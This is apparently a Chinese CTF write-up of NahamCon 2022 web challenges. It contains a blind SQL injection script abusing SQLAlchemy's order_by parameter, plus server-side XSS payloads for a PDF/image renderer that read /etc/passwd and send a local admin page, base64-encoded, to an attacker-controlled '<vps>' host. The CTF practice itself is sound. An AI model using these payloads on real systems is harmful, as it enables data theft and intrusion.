---
uuid: 83dd6211-35e5-bad3-5a36-98c844d97575
title: nahamcon
date: 2022-05-03 12:36:29
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

一个外国比赛记录一下web题目

<!--more-->

# Flaskmetal Alchemist

![](https://z4a.net/images/2022/05/03/image.png)

在附件里看到有版本号![](https://z4a.net/images/2022/05/03/image3dac2e8ebba12bd0.png)

同时发现flag在Flag里面![](https://z4a.net/images/2022/05/03/imagea6ad23a2f8b33341.png)

![](https://z4a.net/images/2022/05/03/imagecdf69a9ead10c0fa.png)

在这上面看到like与两个%包裹用户输入的数据，这里无法进行注入，往下看到有个order_by这里可控存在注入。

[SQLAlchemy 到 1.2.17 和 1.3.x 到 1.3.0b2 允许通过 order_by 参数进行 SQL 注入](https://github.com/sqlalchemy/sqlalchemy/issues/4481)

![](https://z4a.net/images/2022/05/03/imagee9f9bcc3db4b4fd3.png)

```
import requests
import time

s='abcdefghijklmnopqrstuvwxyz1234567890{}_-[]()!~QWERTYUIOPASDFGHJKLZXCVBNM'
url = "http://challenge.nahamcon.com:30678/"

flag=''
for i in range(1,40):
 for a in s:
    payload="case when(substr((select flag from Flag),{},1)='{}') then randomblob(1) else 2 end limit 1,1".format(i,a)
    data = {"search":"Li","order":payload}
    r=requests.post(url,data=data)
    if "Beryllium" not in r.text:
        flag+=a
        print(flag)
        break
    else:
        pass
```

![](https://z4a.net/images/2022/05/03/image28aa6b56f2c568a3.png)

# Hacker Ts

![](https://z4a.net/images/2022/05/03/image15dc18bbcd2ae3be.png)

![](https://z4a.net/images/2022/05/03/imagecfa6cf8b13e1bc37.png)

没有注入，插了一下发现应该是考察的xss，同时有admin，但是打不开![](https://z4a.net/images/2022/05/03/image625c2a9f5521b2a0.png)

你输入啥就会在衣服上打印啥![](https://z4a.net/images/2022/05/03/image41c8457a984f5765.png)

尝试了一般的恶意代码但是没啥用。

这个文章给了灵感，[服务器端 XSS（动态 PDF）](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)，存在一个服务端xss，利用本地文件读取

```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```
**payload**

```
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)
};
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```

执行报错![](https://z4a.net/images/2022/05/03/imagead98f5c414eaed6b.png)

使用了 wkhtmltoimage,查询得到wkhtmltopdf,在0.12.6版本默认禁止读取本地文件，

不过还可以利用 **XMLHttpRequest** 去让服务器访问/admin，然后将访问的内容返回到vps上

```
<script>
x=new XMLHttpRequest();
x.open("GET","http://localhost:5000/admin");
x.onload=function(){var i = new Image(); i.src = "https://<vps>/?c=" + btoa(this.responseText)};
x.send();
</script>
```

把payload urlencode之后再用,然后正常情况下应该在vps下监听到，但是竟然直接回显了

![](https://z4a.net/images/2022/05/03/image82b45dec01c62465.png)

![](https://z4a.net/images/2022/05/03/imageb373dfcd7a1e9431.png)

flag{461e2452088eb397b6138a5934af6231}

涉及知识点

[XMLHttpRequestEventTarget.onload](https://developer.mozilla.org/zh-CN/docs/conflicting/Web/API/XMLHttpRequest/load_event)

# Deafcon

![](https://z4a.net/images/2022/05/03/imagea69c165a2d2616d1.png)

# Two For One
